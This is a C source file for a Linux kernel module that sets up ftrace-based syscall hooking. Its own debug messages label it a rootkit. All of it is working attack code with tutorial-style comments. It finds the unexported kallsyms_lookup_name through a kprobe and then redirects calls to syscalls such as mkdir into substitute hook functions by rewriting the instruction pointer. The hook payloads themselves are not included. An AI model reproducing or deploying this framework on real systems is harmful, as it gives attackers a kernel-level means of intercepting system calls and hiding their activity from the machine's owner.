#include <linux/version.h>
#include <linux/module.h>
#include <linux/ftrace.h>
#include <linux/linkage.h>
#include <linux/slab.h>
#include <linux/uaccess.h>
#include <linux/kallsyms.h>
#include <linux/kprobes.h> // Include kprobes header

#if defined(CONFIG_X86_64) && (LINUX_VERSION_CODE >= KERNEL_VERSION(4,17,0))
#define PTREGS_SYSCALL_STUBS 1
#endif


//x64 requires a different naming convention, __x64_ is prepended
#ifdef PTREGS_SYSCALL_STUBS
#define SYSCALL_NAME(name) ("__x64_" name)
#else
#define SYSCALL_NAME(name) (name)
#endif

#define HOOK(_name, _hook, _orig) { \
    .name = SYSCALL_NAME(_name),    \
    .function = (_hook),            \
    .original = (_orig),            \
}

/*This prevents recursive loops when hooking by detecting recurision at the
* function return address. We do this by setting USE_FENTRY_OFFSET = 0.
*/
#define USE_FENTRY_OFFSET 0
#if !USE_FENTRY_OFFSET
#pragma GCC optimize("-fno-optimize-sibling-calls")
#endif

/*We pack all the information we need (name, hooking function, original 
* function) into this struct. This makes it easier for setting up the hook
* and just passing the entire struct off to fh_install_hook() later on.
*/
struct Ftrace_Hook {
    const char* name;           //kernel symbol string ("__x64_sys_mkdir")
    void* function;             //the hook function
    void* original;             //address of the original function

    unsigned long address;      //resolved addr
    struct ftrace_ops ops;      //ftrace's control block for this hook
};

/* Define a function pointer for kallsyms_lookup_name */
#if LINUX_VERSION_CODE >= KERNEL_VERSION(5,7,0)
    static struct kprobe kp = {
        .symbol_name = "kallsyms_lookup_name" 
    };
    typedef unsigned long (*kallsyms_lookup_name_t)(const char* name);
    static kallsyms_lookup_name_t my_kallsyms_lookup_name = NULL;
#endif

/*Ftrace needs to know the address of the original function that we are 
* going to hook. As before, we just use kallsyms_lookup_name() to find
* the address in kernel memory.
*/
static int fh_resolve_hook_address(struct Ftrace_Hook* hook) {
#if LINUX_VERSION_CODE >= KERNEL_VERSION(5,7,0)

    if (!my_kallsyms_lookup_name) {
        // Resolve kallsyms_lookup_name using kprobes if not already done
        register_kprobe(&kp); //this will set kp.addr based on the .symbol_name
        my_kallsyms_lookup_name = (kallsyms_lookup_name_t)kp.addr; //the addr to the function kallsyms_lookup_name()
        unregister_kprobe(&kp);
    }
    if (!my_kallsyms_lookup_name) {
        pr_debug("rootkit: kallsyms_lookup_name not found via kprobes\n");
        return -ENOENT;
    }

    hook->address = my_kallsyms_lookup_name(hook->name);
#else
    // Fallback to direct kallsyms_lookup_name for older kernels
    hook->address = kallsyms_lookup_name(hook->name);
#endif

    if (!hook->address) {
        pr_debug("rootkit: unresolved symbol: %s\n", hook->name);
        return -ENOENT;
    }

#if USE_FENTRY_OFFSET
    *((unsigned long*) hook->original) = hook->address + MCOUNT_INSN_SIZE;
#else
    *((unsigned long*) hook->original) = hook->address;
#endif

    return 0;
}

static void notrace fh_ftrace_thunk(unsigned long ip, //addr of the function about to run
                                    unsigned long parent_ip, //return addr/caller to detect recursion
                                    struct ftrace_ops* ops,  //the ftrace registration block set up earlier
                                    struct ftrace_regs* fregs) { //ftrace's saved registers wrapper
    struct Ftrace_Hook* hook = container_of(ops, struct Ftrace_Hook, ops); //get hook based on offset of member
    struct pt_regs *regs = ftrace_get_regs(fregs);

#if USE_FENTRY_OFFSET
    regs->ip = (unsigned long)hook->function;
#else
    if(!within_module(parent_ip, THIS_MODULE)) {
        regs->ip = (unsigned long)hook->function;
    }
#endif
}

int fh_install_hook(struct Ftrace_Hook* hook) {
    int err;
    err = fh_resolve_hook_address(hook); //uses kallsyms_lookup_name()
    if (err) {
        return err;
    }

    hook->ops.func = fh_ftrace_thunk;   //tells ftrace which callback to run
    hook->ops.flags = FTRACE_OPS_FL_SAVE_REGS //ftrace must save cpu regs
                    | FTRACE_OPS_FL_RECURSION //enable ftrace's recursion handling
                    | FTRACE_OPS_FL_IPMODIFY; //instruction ptr will me modify

    err = ftrace_set_filter_ip(&hook->ops, hook->address, 0, 0); //only apply thunk based on original addr
    if (err) {
        pr_debug("rootkit: ftrace_set_filter_ip() failed: %d\n", err);
        return err;
    }

    err = register_ftrace_function(&hook->ops); //activate the hook
    if (err) {
        pr_debug("rootkit: register_ftrace_function() failed: %d\n", err);
        return err;
    }

    return 0;
}

void fh_remove_hook(struct Ftrace_Hook* hook) {
    int err;
    err = unregister_ftrace_function(&hook->ops);
    if (err) {
        pr_debug("rootkit: unregister_ftrace_function() failed: %d\n", err);
    }

    err = ftrace_set_filter_ip(&hook->ops, hook->address, 1, 0);
    if (err) {
        pr_debug("rootkit: ftrace_set_filter_ip() failed: %d\n", err);
    }
}

int fh_install_hooks(struct Ftrace_Hook* hooks, size_t count) {
    int err;
    size_t i;

    for (i = 0; i < count; i++) {
        err = fh_install_hook(&hooks[i]);
        if (err) {
            goto error;
        }
    }
    return 0;

error:
    while (i != 0) {
        fh_remove_hook(&hooks[--i]);
    }
    return err;
}

void fh_remove_hooks(struct Ftrace_Hook* hooks, size_t count) {
    size_t i;
    for (i = 0; i < count; i++) {
        fh_remove_hook(&hooks[i]);
    }
}
